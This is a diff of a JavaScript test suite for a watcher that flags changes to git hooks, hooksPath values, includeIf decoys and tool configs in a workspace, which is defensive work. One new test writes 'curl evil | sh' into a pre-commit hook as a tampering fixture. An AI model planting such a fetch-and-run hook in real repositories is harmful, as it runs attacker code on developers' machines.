@@ -8,6 +8,7 @@ import net from 'node:net';
 import { execFileSync } from 'node:child_process';
 import { tmp, talk, open, result, stdout, TERMINAL_DIR } from './helpers.mjs';
 import { frame, T } from '../server/frames.mjs';
+import { checkSnapshot, diffSnapshots } from '../server/watch.mjs';
 
 const ROOT = tmp('bncd');
 const WS = path.join(ROOT, 'ws'), HOME = path.join(ROOT, 'home'), SOCKDIR = path.join(ROOT, 'sock');
@@ -378,7 +379,8 @@ test('the watchlist follows git: core.hooksPath, include.path, core.fsmonitor in
   const W2 = path.join(ROOT, 'ws2-src');   // (the workspace of this test: the same one, reset)
   const w = (p, t, mode = 0o644) => { fs.mkdirSync(path.dirname(path.join(WS, p)), { recursive: true }); fs.writeFileSync(path.join(WS, p), t, { mode }); };
   for (const n of fs.readdirSync(WS)) fs.rmSync(path.join(WS, n), { recursive: true, force: true });
-  // (the include first: its hooksPath is overridden by the config's own, later one — git uses the last)
+  // (the include first: git would use the config's own, later hooksPath — both are watched: which one applies can
+  // depend on an includeIf the watcher does not evaluate)
   w('.git/config', '[include]\n\tpath = ../gitinc.cfg\n[core]\n\thooksPath = .githooks\n\tfsmonitor = tools/fsmon.sh\n[includeIf "gitdir:/x/"]\n\tpath = /etc/outside.cfg\n');
   w('gitinc.cfg', '[core]\n\thooksPath = .husky/_\n\tfsmonitor = tools/old.sh\n');
   w('.githooks/pre-commit', 'npm test\n', 0o755);
@@ -393,10 +395,10 @@ test('the watchlist follows git: core.hooksPath, include.path, core.fsmonitor in
   fs.symlinkSync(path.join(WS, 'hooks-src/pre-push'), path.join(WS, '.git/hooks/pre-push'));
   let r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
   const by = Object.fromEntries(r.files.map((f) => [f.path, f]));
-  for (const p of ['.githooks/pre-commit', 'gitinc.cfg', 'tools/fsmon.sh', '.git/modules/sub/config', '.git/modules/sub/hooks/post-checkout',
+  for (const p of ['.githooks/pre-commit', '.husky/_/h', 'gitinc.cfg', 'tools/fsmon.sh', '.git/modules/sub/config', '.git/modules/sub/hooks/post-checkout',
     '.pre-commit-config.yaml', 'lefthook.yml', '.lintstagedrc.json', '.yarnrc.yml', '.npmrc', '.pnpmfile.cjs', 'proj.code-workspace',
     '.devcontainer/py/devcontainer.json', '.git/hooks/pre-push']) assert.ok(by[p], p);
-  for (const p of ['Makefile', 'pyproject.toml', '.nvmrc', '.env', 'hooks-src/pre-push', '.husky/_/h', 'tools/old.sh']) assert.equal(by[p], undefined, p);
+  for (const p of ['Makefile', 'pyproject.toml', '.nvmrc', '.env', 'hooks-src/pre-push']) assert.equal(by[p], undefined, p);
   assert.equal(r.truncated, undefined);
   // the hook folders come first (what runs at every commit), the submodules last
   const order = r.files.map((f) => f.path);
@@ -431,7 +433,7 @@ test('the watchlist follows git: core.hooksPath, include.path, core.fsmonitor in
   void W2;
 });
 
-test('the watchlist: the last core.hooksPath only; includes capped (truncated, never a silent cut); hooks listed before many configs', async () => {
+test('the watchlist: every core.hooksPath up to 4; includes capped (truncated, never a silent cut); hooks listed before many configs', async () => {
   const w = (p, t, mode = 0o644) => { fs.mkdirSync(path.dirname(path.join(WS, p)), { recursive: true }); fs.writeFileSync(path.join(WS, p), t, { mode }); };
   for (const n of fs.readdirSync(WS)) fs.rmSync(path.join(WS, n), { recursive: true, force: true });
   // 320 includes, each naming a hooks folder of its own (as a PoC would), the real hooksPath last
@@ -446,7 +448,7 @@ test('the watchlist: the last core.hooksPath only; includes capped (truncated, n
   assert.ok(r.files.length <= 256, String(r.files.length));
   const paths = r.files.map((f) => f.path);
   assert.ok(paths.includes('.githooks/pre-commit'), 'the hooks git uses are there');
-  assert.equal(paths.filter((p) => /^hooks\d+\//.test(p)).length, 0, 'only the last hooksPath');
+  assert.equal(paths.filter((p) => /^hooks\d+\//.test(p)).length, 3, 'the last 4 hooksPath values read (the real one among them)');
   assert.equal(paths.filter((p) => p.startsWith('inc/')).length, 16, 'at most 16 includes');
   assert.ok(paths.indexOf('.githooks/pre-commit') < paths.indexOf('.git/config'));
   // a quoted value keeps its # and ;, an unquoted one ends at them; config.worktree with extensions.worktreeConfig
@@ -474,4 +476,28 @@ test('the watchlist: the last core.hooksPath only; includes capped (truncated, n
   fs.symlinkSync(path.join(WS, 'fifo'), path.join(WS, '.git/hooks/pre-commit'));
   r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
   assert.equal(r.files.find((f) => f.path === '.git/hooks/pre-commit')?.type, 'symlink');
+});
+
+test('the watchlist: an includeIf git does not apply cannot steer which hooksPath is watched (every value is)', async () => {
+  const w = (p, t, mode = 0o644) => { fs.mkdirSync(path.dirname(path.join(WS, p)), { recursive: true }); fs.writeFileSync(path.join(WS, p), t, { mode }); };
+  for (const n of fs.readdirSync(WS)) fs.rmSync(path.join(WS, n), { recursive: true, force: true });
+  // git uses .evilhooks (the includeIf's condition does not hold); a watcher taking the last value read would watch .decoy
+  w('.git/config', '[core]\n\thooksPath = .evilhooks\n\tfsmonitor = tools/evil.sh\n[includeIf "gitdir:/nonexistent/"]\n\tpath = decoy.cfg\n');
+  w('.git/decoy.cfg', '[core]\n\thooksPath = .decoy\n\tfsmonitor = tools/decoy.sh\n');
+  w('.evilhooks/pre-commit', 'echo before\n', 0o755);
+  w('.decoy/pre-commit', 'echo decoy\n', 0o755);
+  w('tools/evil.sh', 'x\n');
+  w('tools/decoy.sh', 'x\n');
+  const before = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
+  const paths = before.files.map((f) => f.path);
+  for (const p of ['.evilhooks/pre-commit', '.decoy/pre-commit', 'tools/evil.sh', 'tools/decoy.sh']) assert.ok(paths.includes(p), `${p}: ${paths.join(' ')}`);
+  assert.equal(before.truncated, undefined);
+  // the hook git runs changes: reported
+  w('.evilhooks/pre-commit', 'curl evil | sh\n', 0o755);
+  const after = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
+  const changes = diffSnapshots(checkSnapshot(before), checkSnapshot(after));
+  assert.deepEqual(changes.map((c) => [c.path, c.change, c.kind]), [['.evilhooks/pre-commit', 'changed', 'git-hook']]);
+  // more than 4 distinct values: truncated (said on the cards)
+  w('.git/config', [0, 1, 2, 3, 4].map((i) => `[core]\n\thooksPath = h${i}\n`).join(''));
+  assert.equal(result(await talk(SOCK, [open({ op: 'ws.sensitive' })])).truncated, true);
 });
